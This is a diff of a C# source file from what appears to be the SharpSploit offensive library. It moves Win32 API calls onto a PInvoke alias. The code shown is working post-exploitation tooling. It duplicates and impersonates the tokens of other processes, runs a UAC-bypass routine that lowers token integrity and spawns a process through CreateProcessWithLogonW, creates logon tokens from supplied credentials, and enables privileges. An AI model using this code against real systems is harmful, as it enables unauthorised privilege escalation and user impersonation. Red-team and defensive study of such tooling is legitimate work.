@@ -12,6 +12,7 @@ using System.Collections.Generic;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Execution;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
 namespace SharpSploit.Credentials
 {
@@ -105,7 +106,7 @@ namespace SharpSploit.Credentials
 
             Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
             IntPtr hDuplicateToken = IntPtr.Zero;
-            if (!Win32.Advapi32.DuplicateTokenEx(
+            if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
                     hProcessToken,
                     (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                     ref securityAttributes,
@@ -121,7 +122,7 @@ namespace SharpSploit.Credentials
             }
             this.OpenHandles.Add(hDuplicateToken);
 
-            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken))
+            if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken))
             {
                 Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 this.CloseHandle(hProcessToken);
@@ -169,7 +170,7 @@ namespace SharpSploit.Credentials
             foreach (Process process in processes)
             {
                 // Get PrimaryToken
-                IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, (UInt32)process.Id);
+                IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, false, (UInt32)process.Id);
                 if (hProcess == IntPtr.Zero)
                 {
                     Console.Error.WriteLine("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
@@ -178,7 +179,7 @@ namespace SharpSploit.Credentials
                 this.OpenHandles.Add(hProcess);
 
                 IntPtr hProcessToken = IntPtr.Zero;
-                if (!Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
+                if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
                 {
                     Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     continue;
@@ -188,7 +189,7 @@ namespace SharpSploit.Credentials
 
                 Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
                 IntPtr hDuplicateToken = IntPtr.Zero;
-                if (!Win32.Advapi32.DuplicateTokenEx(
+                if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
                        hProcessToken,
                        (UInt32)Win32.Advapi32.TOKEN_ALL_ACCESS,
                        ref securityAttributes,
@@ -208,7 +209,7 @@ namespace SharpSploit.Credentials
                 pIdentifierAuthority.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
                 byte nSubAuthorityCount = 1;
                 IntPtr pSid = new IntPtr();
-                if (!Win32.Advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSid))
+                if (!PInvoke.Win32.Advapi32.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSid))
                 {
                     Console.Error.WriteLine("AllocateAndInitializeSid() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     continue;
@@ -222,14 +223,14 @@ namespace SharpSploit.Credentials
                 tokenMandatoryLevel.Label = sidAndAttributes;
                 Int32 tokenMandatoryLabelSize = Marshal.SizeOf(tokenMandatoryLevel);
 
-                if (Win32.NtDll.NtSetInformationToken(hDuplicateToken, 25, ref tokenMandatoryLevel, tokenMandatoryLabelSize) != 0)
+                if (PInvoke.Native.NtSetInformationToken(hDuplicateToken, 25, ref tokenMandatoryLevel, tokenMandatoryLabelSize) != 0)
                 {
                     Console.Error.WriteLine("NtSetInformationToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     continue;
                 }
 
                 IntPtr hFilteredToken = IntPtr.Zero;
-                if (Win32.NtDll.NtFilterToken(hDuplicateToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref hFilteredToken) != 0)
+                if (PInvoke.Native.NtFilterToken(hDuplicateToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref hFilteredToken) != 0)
                 {
                     Console.Error.WriteLine("NtFilterToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     continue;
@@ -240,7 +241,7 @@ namespace SharpSploit.Credentials
                 // ImpersonateUser
                 Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes2 = new Win32.WinBase._SECURITY_ATTRIBUTES();
                 IntPtr hDuplicateToken2 = IntPtr.Zero;
-                if (!Win32.Advapi32.DuplicateTokenEx(
+                if (!PInvoke.Win32.Advapi32.DuplicateTokenEx(
                        hFilteredToken,
                        (UInt32)(Win32.Advapi32.TOKEN_IMPERSONATE | Win32.Advapi32.TOKEN_QUERY),
                        ref securityAttributes2,
@@ -255,7 +256,7 @@ namespace SharpSploit.Credentials
                 this.OpenHandles.Add(hDuplicateToken2);
                 this.CloseHandle(hFilteredToken);
 
-                if (!Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken2))
+                if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken2))
                 {
                     Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     continue;
@@ -264,7 +265,7 @@ namespace SharpSploit.Credentials
                 Win32.ProcessThreadsAPI._STARTUPINFO startupInfo = new Win32.ProcessThreadsAPI._STARTUPINFO();
                 startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Win32.ProcessThreadsAPI._STARTUPINFO));
                 Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation = new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
-                if (!Win32.Advapi32.CreateProcessWithLogonW(Environment.UserName, Environment.UserDomainName, "password",
+                if (!PInvoke.Win32.Advapi32.CreateProcessWithLogonW(Environment.UserName, Environment.UserDomainName, "password",
                     0x00000002, Path + Binary, Path + Binary + " " + Arguments, 0x04000000, IntPtr.Zero, Path, ref startupInfo, out processInformation))
                 {
                     Console.Error.WriteLine("CreateProcessWithLogonW() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
@@ -295,7 +296,7 @@ namespace SharpSploit.Credentials
         public T RunAs<T>(string Username, string Domain, string Password, Func<T> Action, Win32.Advapi32.LOGON_TYPE LogonType = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE)
         {
             IntPtr hProcessToken = IntPtr.Zero;
-            if (!Win32.Advapi32.LogonUserA(
+            if (!PInvoke.Win32.Advapi32.LogonUserA(
                 Username, Domain, Password,
                 LogonType, Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                 out hProcessToken))
@@ -305,7 +306,7 @@ namespace SharpSploit.Credentials
             }
             this.OpenHandles.Add(hProcessToken);
 
-            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
+            if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
             {
                 Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 this.CloseHandle(hProcessToken);
@@ -333,7 +334,7 @@ namespace SharpSploit.Credentials
         public bool MakeToken(string Username, string Domain, string Password, Win32.Advapi32.LOGON_TYPE LogonType = Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS)
         {
             IntPtr hProcessToken = IntPtr.Zero;
-            if (!Win32.Advapi32.LogonUserA(
+            if (!PInvoke.Win32.Advapi32.LogonUserA(
                 Username, Domain, Password,
                 LogonType, Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
                 out hProcessToken)
@@ -344,7 +345,7 @@ namespace SharpSploit.Credentials
             }
             this.OpenHandles.Add(hProcessToken);
 
-            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
+            if (!PInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hProcessToken))
             {
                 Console.Error.WriteLine("ImpersonateLoggedOnUser() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 this.CloseHandle(hProcessToken);
@@ -361,7 +362,7 @@ namespace SharpSploit.Credentials
         /// <returns>True if RevertToSelf succeeds, false otherwise.</returns>
         public bool RevertToSelf()
         {
-            if (!Win32.Advapi32.RevertToSelf())
+            if (!PInvoke.Win32.Advapi32.RevertToSelf())
             {
                 Console.Error.WriteLine("RevertToSelf() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
@@ -401,7 +402,7 @@ namespace SharpSploit.Credentials
             }
 
             IntPtr ppLogonSessionData = new IntPtr();
-            if (Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
+            if (PInvoke.Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
             {
                 Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return "";
@@ -425,7 +426,7 @@ namespace SharpSploit.Credentials
         private IntPtr GetCurrentProcessToken()
         {
             IntPtr currentProcessToken = new IntPtr();
-            if (!Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out currentProcessToken))
+            if (!PInvoke.Win32.Kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Win32.Advapi32.TOKEN_ALL_ACCESS, out currentProcessToken))
             {
                 Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return IntPtr.Zero;
@@ -440,7 +441,7 @@ namespace SharpSploit.Credentials
             IntPtr tokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UInt32)));
             UInt32 returnLength;
 
-            Boolean result = Win32.Advapi32.GetTokenInformation(
+            bool result = PInvoke.Win32.Advapi32.GetTokenInformation(
                 hToken,
                 Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenElevationType,
                 tokenInformation,
@@ -463,7 +464,7 @@ namespace SharpSploit.Credentials
 
         private IntPtr GetTokenForProcess(UInt32 ProcessID)
         {
-            IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION, true, ProcessID);
+            IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION, true, ProcessID);
             if (hProcess == IntPtr.Zero)
             {
                 Console.Error.WriteLine("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
@@ -472,7 +473,7 @@ namespace SharpSploit.Credentials
             this.OpenHandles.Add(hProcess);
 
             IntPtr hProcessToken = IntPtr.Zero;
-            if (!Win32.Kernel32.OpenProcessToken(hProcess, Win32.Advapi32.TOKEN_ALT, out hProcessToken))
+            if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, Win32.Advapi32.TOKEN_ALT, out hProcessToken))
             {
                 Console.Error.WriteLine("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return IntPtr.Zero;
@@ -486,7 +487,7 @@ namespace SharpSploit.Credentials
         private bool CloseHandle(IntPtr handle, bool Remove = true)
         {
             if (Remove) { this.OpenHandles.Remove(handle); }
-            return Win32.Kernel32.CloseHandle(handle);
+            return PInvoke.Win32.Kernel32.CloseHandle(handle);
         }
 
         private static List<String> Privileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
@@ -515,7 +516,7 @@ namespace SharpSploit.Credentials
                 return false;
             }
             Win32.WinNT._LUID luid = new Win32.WinNT._LUID();
-            if (!Win32.Advapi32.LookupPrivilegeValue(null, Privilege, ref luid))
+            if (!PInvoke.Win32.Advapi32.LookupPrivilegeValue(null, Privilege, ref luid))
             {
                 Console.Error.WriteLine("LookupPrivilegeValue() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
@@ -531,7 +532,7 @@ namespace SharpSploit.Credentials
 
             Win32.WinNT._TOKEN_PRIVILEGES previousState = new Win32.WinNT._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
-            if (!Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!PInvoke.Win32.Advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 Console.Error.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
@@ -555,31 +556,31 @@ namespace SharpSploit.Credentials
             public UserProcessToken(Process process)
             {
                 this.Process = process;
-                IntPtr hProcess = Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)this.Process.Id);
+                IntPtr hProcess = PInvoke.Win32.Kernel32.OpenProcess(Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, true, (UInt32)this.Process.Id);
                 if (hProcess == IntPtr.Zero)
                 {
                     throw new CreateUserProcessTokenException("OpenProcess() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 }
 
                 IntPtr hProcessToken;
-                if (!Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
+                if (!PInvoke.Win32.Kernel32.OpenProcessToken(hProcess, (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, out hProcessToken))
                 {
                     throw new CreateUserProcessTokenException("OpenProcessToken() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 }
-                Win32.Kernel32.CloseHandle(hProcess);
+                PInvoke.Win32.Kernel32.CloseHandle(hProcess);
 
                 UInt32 dwLength = 0;
                 Win32.WinNT._TOKEN_STATISTICS tokenStatistics = new Win32.WinNT._TOKEN_STATISTICS();
                 this.TokenType = tokenStatistics.TokenType;
-                if (!Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
+                if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                 {
-                    if (!Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
+                    if (!PInvoke.Win32.Advapi32.GetTokenInformation(hProcessToken, Win32.WinNT._TOKEN_INFORMATION_CLASS.TokenStatistics, ref tokenStatistics, dwLength, out dwLength))
                     {
                         throw new CreateUserProcessTokenException("GetTokenInformation() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     }
                 }
                 this.IsElevated = TokenIsElevated(hProcessToken);
-                Win32.Kernel32.CloseHandle(hProcessToken);
+                PInvoke.Win32.Kernel32.CloseHandle(hProcessToken);
 
                 this.Username = ConvertTokenStatisticsToUsername(tokenStatistics);
                 if (this.Username == null || this.Username == "")
@@ -599,7 +600,7 @@ namespace SharpSploit.Credentials
                 }
 
                 IntPtr ppLogonSessionData = new IntPtr();
-                if (Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
+                if (PInvoke.Win32.Secur32.LsaGetLogonSessionData(lpLuid, out ppLogonSessionData) != 0)
                 {
                     Console.Error.WriteLine("LsaGetLogonSessionData() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                     return "";
@@ -639,11 +640,11 @@ namespace SharpSploit.Credentials
                 StringBuilder lpReferencedDomainName = new StringBuilder();
                 UInt32 cchReferencedDomainName = (UInt32)lpReferencedDomainName.Capacity;
                 Win32.WinNT._SID_NAME_USE sidNameUser;
-                Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser);
+                PInvoke.Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser);
 
                 lpName.EnsureCapacity((Int32)cchName);
                 lpReferencedDomainName.EnsureCapacity((Int32)cchReferencedDomainName);
-                if (Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser))
+                if (PInvoke.Win32.Advapi32.LookupAccountSid(String.Empty, pSid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out sidNameUser))
                 {
                     return "";
                 }
